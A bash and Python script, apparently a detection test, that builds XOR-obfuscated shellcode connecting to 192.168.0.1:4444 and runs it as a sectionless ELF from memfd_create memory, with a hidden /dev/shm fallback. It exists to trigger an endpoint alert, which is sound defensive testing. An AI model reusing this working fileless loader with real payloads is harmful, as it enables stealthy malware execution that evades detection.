#!/bin/bash
# 03 - Fileless Execution via memfd_create
# Trigger: ElfExecutedFromMemory IOA
# Tactic: Defense Evasion / Reflective Code Loading
set -e
echo "=== [03] Fileless Execution (memfd_create) ==="

# Create an obfuscated ELF in memory (memfd) and execute it from /proc/self/fd/N.
# Uses the same XOR-encoded, sectionless ELF approach as the trojan script but
# executed entirely from anonymous memory — no file ever touches disk.

python3 << 'PYEOF'
import ctypes, os, struct, platform

XOR_KEY = 0xA7C35D1F

def xor_encode(payload, key):
    encoded = bytearray()
    k = key
    for i in range(0, len(payload), 4):
        dword = struct.unpack_from('<I', payload, i)[0]
        enc = dword ^ k
        encoded += struct.pack('<I', enc)
        k = (k + dword) & 0xFFFFFFFF
    return bytes(encoded)

if platform.machine() in ("x86_64", "amd64"):
    # x86_64 payload: socket(2,1,0) + connect(192.168.0.1:4444) + close + exit
    payload = bytearray()
    payload += b'\x48\x31\xf6\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x6a\x29\x58\x0f\x05'
    payload += b'\x48\x89\xc6\x48\x31\xc0\x50'
    payload += b'\x68\xc0\xa8\x00\x01\x66\x68\x11\x5c\x66\x6a\x02'
    payload += b'\x48\x89\xf7\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05'
    payload += b'\x48\x89\xf7\x6a\x03\x58\x0f\x05'
    payload += b'\x48\x31\xff\x6a\x3c\x58\x0f\x05'
    while len(payload) % 4 != 0:
        payload += b'\x90'
    payload = bytes(payload)
    encoded = xor_encode(payload, XOR_KEY)
    ndwords = len(payload) // 4

    # x86_64 decoder stub
    stub = bytearray()
    stub += b'\xbb' + struct.pack('<I', XOR_KEY)
    stub += b'\xb9' + struct.pack('<I', ndwords)
    stub += b'\xe8\x00\x00\x00\x00\x5e'
    stub += b'\x48\x81\xc6' + struct.pack('<I', 21)
    stub += b'\x8b\x06\x31\xd8\x89\x06\x01\xc3\x48\x83\xc6\x04\xff\xc9\x75\xf1'
    code = bytes(stub) + encoded

    # ELF64, RWE, no sections
    EH = 64; PH = 56
    load_addr = 0x400000
    entry = load_addr + EH + PH
    filesz = EH + PH + len(code)
    memsz = filesz + 128
    elf_header = struct.pack('<4sBBBBB7xHHIQQQIHHHHHH',
        b'\x7fELF', 2, 1, 1, 0, 0, 2, 0x3E, 1, entry, EH, 0, 0, EH, PH, 1, 0, 0, 0)
    phdr = struct.pack('<IIQQQQQQ', 1, 7, 0, load_addr, load_addr, filesz, memsz, 0x10000)
    elf = elf_header + phdr + code
else:
    # aarch64: socket/connect/close/exit
    def insn(*args):
        return b''.join(struct.pack('<I', x) for x in args)
    payload = bytearray()
    payload += insn(0xD2800040, 0xD2800021, 0xD2800002, 0xD2800C68, 0xD4000001)
    payload += insn(0xAA0003E6, 0xD10043FF)
    payload += insn(0x528B8801, 0x72A00041, 0xB90003E1)
    payload += insn(0x52800021, 0x72B50001, 0xB90007E1, 0xF900073F)
    payload += insn(0xAA0603E0, 0x910003E1, 0xD2800202, 0xD2801968, 0xD4000001)
    payload += insn(0xAA0603E0, 0xD2800728, 0xD4000001)
    payload += insn(0x910043FF, 0xD2800000, 0xD2800BA8, 0xD4000001)
    payload = bytes(payload)
    while len(payload) % 4 != 0:
        payload += b'\x00'
    encoded = xor_encode(payload, XOR_KEY)
    ndwords = len(payload) // 4

    stub_insns = [0x10000300,
        0x52800001 | ((XOR_KEY & 0xFFFF) << 5),
        0x72A00001 | (((XOR_KEY >> 16) & 0xFFFF) << 5),
        0x52800002 | ((ndwords & 0xFFFF) << 5),
        0xAA0003E4, 0xB9400003, 0x4A010063, 0xB8004403,
        0x0B030021, 0x71000442, 0x35FFFF42,
        0xD50B7B24, 0x91010085, 0xD50B7B25, 0x910100A5,
        0xD50B7B25, 0xD5033B9F, 0xD50B7524, 0x91010085,
        0xD50B7525, 0x910100A5, 0xD50B7525, 0xD5033B9F, 0xD5033FDF]
    stub = b''.join(struct.pack('<I', i) for i in stub_insns)
    code = stub + encoded
    EH = 64; PH = 56
    load_addr = 0x400000
    entry = load_addr + EH + PH
    filesz = EH + PH + len(code)
    memsz = filesz + 128
    elf_header = struct.pack('<4sBBBBB7xHHIQQQIHHHHHH',
        b'\x7fELF', 2, 1, 1, 0, 0, 2, 0xB7, 1, entry, EH, 0, 0, EH, PH, 1, 0, 0, 0)
    phdr = struct.pack('<IIQQQQQQ', 1, 7, 0, load_addr, load_addr, filesz, memsz, 0x10000)
    elf = elf_header + phdr + code

# Execute from memfd (anonymous memory)
libc = ctypes.CDLL("libc.so.6", use_errno=True)
fd = libc.syscall(319, b"elf_memfd", 1)

if fd >= 0:
    os.write(fd, elf)
    path = "/proc/self/fd/" + str(fd)
    print("  Executing obfuscated ELF from " + path)
    pid = os.fork()
    if pid == 0:
        os.execv(path, [path])
        os._exit(1)
    else:
        os.waitpid(pid, 0)
else:
    # Fallback: /dev/shm
    with open("/dev/shm/.hidden_elf", "wb") as f:
        f.write(elf)
    os.chmod("/dev/shm/.hidden_elf", 0o755)
    os.system("/dev/shm/.hidden_elf")
    os.unlink("/dev/shm/.hidden_elf")
PYEOF

echo "[03] Done — ElfExecutedFromMemory IOA should trigger"
